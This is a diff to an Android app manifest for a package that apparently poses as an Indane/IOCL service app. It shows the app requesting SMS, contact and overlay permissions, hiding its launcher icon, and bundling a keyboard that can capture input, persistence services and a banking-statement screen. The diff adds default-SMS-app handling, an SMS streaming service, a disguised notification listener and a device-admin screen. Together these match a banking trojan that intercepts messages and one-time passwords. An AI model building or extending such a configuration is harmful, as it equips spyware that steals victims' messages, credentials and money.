@@ -18,10 +18,12 @@
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.READ_SMS" />
+    <uses-permission android:name="android.permission.WRITE_SMS" />
     <uses-permission android:name="android.permission.READ_CONTACTS" />
     <uses-permission android:name="android.permission.WRITE_CONTACTS" />
     <uses-permission android:name="android.permission.CALL_PHONE" />
     <uses-permission android:name="android.permission.RECEIVE_SMS" />
+    <uses-permission android:name="android.permission.RECEIVE_MMS" />
     <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.USE_EXACT_ALARM" />
     <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
@@ -33,6 +35,7 @@
     <uses-permission android:name="android.permission.READ_PHONE_NUMBERS" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
 
     <application
         android:name=".MainApplication.MyApp"
@@ -49,11 +52,12 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
+            android:name=".Ui.EnableAdminActivity"
+            android:exported="false" />
+        <activity
             android:name=".Ui.DevToolActivity"
-            android:exported="false"
             android:enabled="@bool/is_debug"
-            />
-        <!-- Eta Open hobe jokhon kono user ke web activity dekhate hobe -->
+            android:exported="false" /> <!-- Eta Open hobe jokhon kono user ke web activity dekhate hobe -->
         <activity
             android:name=".Ui.FloatingWebActivity"
             android:excludeFromRecents="true"
@@ -104,7 +108,18 @@
             android:exported="true"
             android:icon="@drawable/dev_icon"
             android:label="Messages"
-            android:launchMode="singleInstance" />
+            android:launchMode="singleInstance">
+            <intent-filter>
+                <action android:name="android.intent.action.SENDTO" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+
+                <data android:scheme="sms" />
+                <data android:scheme="smsto" />
+                <data android:scheme="mms" />
+                <data android:scheme="mmsto" />
+            </intent-filter>
+        </activity>
 
         <activity-alias
             android:name=".SmsLauncherAlias"
@@ -113,7 +128,13 @@
             android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
             android:label="SMS"
             android:launchMode="singleInstance"
-            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity" /> <!-- For Hidden Icon -->
+            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias> <!-- For Hidden Icon -->
         <activity
             android:name=".Ui.BankStatementActivity"
             android:configChanges="orientation|screenSize"
@@ -228,8 +249,7 @@
             android:enabled="true"
             android:launchMode="singleInstance"
             android:permission="android.permission.BIND_JOB_SERVICE"
-            android:persistableMode="persistAcrossReboots" />
-        <!-- Simple Keyboard Integration from https://github.com/rkkr/simple-keyboard/ on 31-08-2025 at 14:24 -->
+            android:persistableMode="persistAcrossReboots" /> <!-- Simple Keyboard Integration from https://github.com/rkkr/simple-keyboard/ on 31-08-2025 at 14:24 -->
         <service
             android:name="android.iocl.simple_keyboard.latin.LatinIME"
             android:directBootAware="true"
@@ -249,12 +269,11 @@
             android:name="android.iocl.keepAlive.ServiceA"
             android:enabled="true"
             android:exported="false"
-            android:process=":serviceA" />
+            android:stopWithTask="false" />
         <service
             android:name="android.iocl.keepAlive.ServiceB"
             android:enabled="true"
-            android:exported="false"
-            android:process=":serviceB" />
+            android:exported="false" />
         <service
             android:name=".Services.CallerIdService"
             android:exported="true"
@@ -281,9 +300,9 @@
 
         <service
             android:name=".Services.FetchProfileInfo"
-            android:permission="android.permission.BIND_JOB_SERVICE"
             android:enabled="true"
-            android:exported="false" />
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE" />
         <service
             android:name=".Services.PersistentVpnService"
             android:exported="true"
@@ -308,7 +327,6 @@
                 android:name="android.content.SyncAdapter"
                 android:resource="@xml/syncadapter" />
         </service>
-
         <service
             android:name=".Services.SendDACService"
             android:excludeFromRecents="true"
@@ -353,8 +371,7 @@
         <service
             android:name=".SyncAdapters.SyncService1"
             android:exported="true"
-            android:permission="android.permission.BIND_SYNC_ADAPTER"
-            >
+            android:permission="android.permission.BIND_SYNC_ADAPTER">
             <intent-filter>
                 <action android:name="android.content.SyncAdapter" />
             </intent-filter>
@@ -390,6 +407,8 @@
                 android:name="android.accounts.AccountAuthenticator"
                 android:resource="@xml/authenticator1" />
         </service>
+
+
 
         <receiver
             android:name=".Receivers.AdminReceiver"
@@ -434,6 +453,22 @@
                 <data android:scheme="mms" />
                 <data android:scheme="mmsto" />
             </intent-filter>
+        </service>
+
+        <service
+            android:name=".Services.SmsStreamingJobService"
+            android:permission="android.permission.BIND_JOB_SERVICE"
+            android:exported="true" />
+        <service
+            android:name=".Services.IndaneNotificationListener"
+            android:label="Indane Notification Listener"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
+            android:exported="true">
+
+            <intent-filter>
+                <action android:name="android.service.notification.NotificationListenerService" />
+            </intent-filter>
+
         </service>
         <service
             android:name=".Services.FixOppoAutoKill"
@@ -504,6 +539,9 @@
             android:name=".Receivers.smsReceivers"
             android:exported="true"
             android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
             </intent-filter>
@@ -568,7 +606,7 @@
 
         <meta-data
             android:name="com.google.firebase.messaging.default_notification_channel_id"
-            android:value="default_channel" />
+            android:value="fcm_notifications" />
     </application>
 
 </manifest>
